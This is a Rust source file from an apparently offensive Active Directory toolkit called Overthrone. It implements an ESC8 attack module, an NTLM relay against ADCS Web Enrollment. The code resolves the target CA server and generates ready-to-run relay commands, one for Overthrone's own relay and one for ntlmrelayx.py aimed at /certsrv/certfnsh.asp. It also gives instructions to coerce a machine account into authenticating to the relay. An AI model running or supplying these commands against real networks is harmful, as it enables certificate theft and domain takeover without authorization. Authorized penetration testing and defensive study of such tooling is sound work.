//! ESC8 (NTLM Relay to ADCS Web Enrollment) execution
//!
//! Exposes functions to configure and launch an NTLM relay attack
//! targeting an ADCS Web Enrollment endpoint.

use crate::adcs::Esc8RelayTarget;
use crate::error::{OverthroneError, Result};
use std::net::{SocketAddr, ToSocketAddrs};
use std::time::Duration;
use tracing::{info, warn};

/// Configuration for an ESC8 Relay attack
pub struct Esc8AttackConfig {
    pub listener_ip: String,
    pub target: Esc8RelayTarget,
}

impl Esc8AttackConfig {
    pub fn new(listener_ip: impl Into<String>, target: Esc8RelayTarget) -> Self {
        Self {
            listener_ip: listener_ip.into(),
            target,
        }
    }

    /// Generate the ESC8 relay attack command instructions
    ///
    /// This generates the required command to launch the relay attack
    /// targeting the ADCS Web Enrollment endpoint via Overthrone CLI or Certipy.
    pub fn generate_exploit_commands(&self) -> Result<String> {
        info!("Generating ESC8 Relay Attack Instructions");
        info!("Target CA Server: {}", self.target.ca_server);
        info!("Target Template: {}", self.target.template);
        if let Some(upn) = &self.target.target_upn {
            info!("Target UPN: {}", upn);
        }

        // Resolve the CA server IP
        let target_addr_str = format!("{}:80", self.target.ca_server);
        let target_addr = target_addr_str
            .to_socket_addrs()
            .map_err(|e| {
                OverthroneError::Relay(format!(
                    "Failed to resolve CA server {}: {}",
                    self.target.ca_server, e
                ))
            })?
            .next()
            .ok_or_else(|| {
                OverthroneError::Relay(format!(
                    "No IP addresses found for {}",
                    self.target.ca_server
                ))
            })?;

        let overthrone_relay_cmd = format!(
            "overthrone relay start --interface {} --target http://{} --template {} {}",
            self.listener_ip,
            target_addr.ip(),
            self.target.template,
            if let Some(upn) = &self.target.target_upn {
                format!("--target-upn {}", upn)
            } else {
                "".to_string()
            }
        );

        let ntlmrelayx_cmd = format!(
            "ntlmrelayx.py -t http://{}/certsrv/certfnsh.asp -smb2support --adcs --template {}",
            target_addr.ip(),
            self.target.template
        );

        let instructions = format!(
            "=== ESC8 Relay Attack Generation ===\n\
             The CA Web Enrollment endpoint on '{}' is vulnerable to ESC8.\n\
             To avoid cyclic dependencies, Overthrone uses command generation to orchestrate this module.\n\n\
             [Overthrone Relay (Built-in)]\n\
             Run the following command in a new terminal to start the local relay:\n\
             {}\n\n\
             [ntlmrelayx.py (Impacket)]\n\
             Alternatively, you can use ntlmrelayx from Impacket:\n\
             {}\n\n\
             Coerce authentication from a machine account to your relay IP ({}) to execute the attack.\n",
            self.target.ca_server, overthrone_relay_cmd, ntlmrelayx_cmd, self.listener_ip
        );

        Ok(instructions)
    }
}
